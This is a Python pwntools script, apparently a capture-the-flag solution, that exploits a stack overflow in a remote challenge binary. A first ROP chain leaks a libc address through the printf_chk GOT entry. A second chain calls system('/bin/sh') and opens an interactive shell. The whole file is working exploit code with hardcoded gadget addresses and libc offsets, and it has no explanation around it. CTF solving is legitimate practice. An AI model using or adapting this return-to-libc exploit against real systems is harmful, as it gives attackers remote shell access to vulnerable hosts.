import os
import sys

from pwn import p64
sys.path.append(os.path.dirname(os.path.normpath(__file__)))

from pwn import *
from payload_gen import encode_bigint

context.arch = "amd64"


addr_main = 0x4012F0

addr_pop_ret = 0x4026b2
addr_pop_rdi_ret = 0x4026b1
addr_pop_rsi_ret = 0x402818
addr_printf_chk_plt = 0x401260
addr_printf_chk_got = 0x409070

offset_libc_printf_chk = 0x137990
offset_libc_do_system = 0x582D0
offset_libc_do_system_2 = 0x582D2
offset_libc_str_bin_sh = 0x1CB42F


stack_padding_bytes = b"\0" * 0x28
rop_chain_1 = (
    p64(addr_pop_rdi_ret) + p64(2) + 
    p64(addr_pop_rsi_ret) + p64(addr_printf_chk_got) + 
    p64(addr_pop_ret) + 
    p64(addr_printf_chk_plt) + 
    p64(addr_pop_ret) + 
    p64(addr_main) + 
    p64(1<<63)
)


# s = process("./pwn")
# s = remote("127.0.0.1", 8888)
s = remote("instance.penguin.0ops.sjtu.cn", 18081) ; s.send(b"CONNECT 4xkv2fphwx8wgpv8:1 HTTP/1.1\r\n\r\n") ; s.recvuntil(b"\r\n\r\n")

# gdb.attach(s, "b *0x40151D")

encoded_input_1 = encode_bigint(int.from_bytes(stack_padding_bytes + rop_chain_1, "little"))
print(len(encoded_input_1))
s.sendlineafter(b"> ", encoded_input_1.encode())

s.recvline()
r = s.recvuntil(b"> ", drop=True)
print(r.hex())
addr_libc_printf_chk = int.from_bytes(r[:6], "little")
addr_libc_base = addr_libc_printf_chk - offset_libc_printf_chk
print(hex(addr_libc_base))

addr_libc_str_bin_sh = addr_libc_base + offset_libc_str_bin_sh
addr_libc_do_system = addr_libc_base + offset_libc_do_system
addr_libc_do_system_2 = addr_libc_base + offset_libc_do_system_2

rop_chain_2 = (
    p64(addr_pop_rdi_ret) + p64(addr_libc_str_bin_sh) + 
    p64(addr_libc_do_system_2) + 
    p64(1<<63)
)

encoded_input_2 = encode_bigint(int.from_bytes(stack_padding_bytes + rop_chain_2, "little"))
print(len(encoded_input_2))

s.sendline(encoded_input_2.encode())

s.interactive()
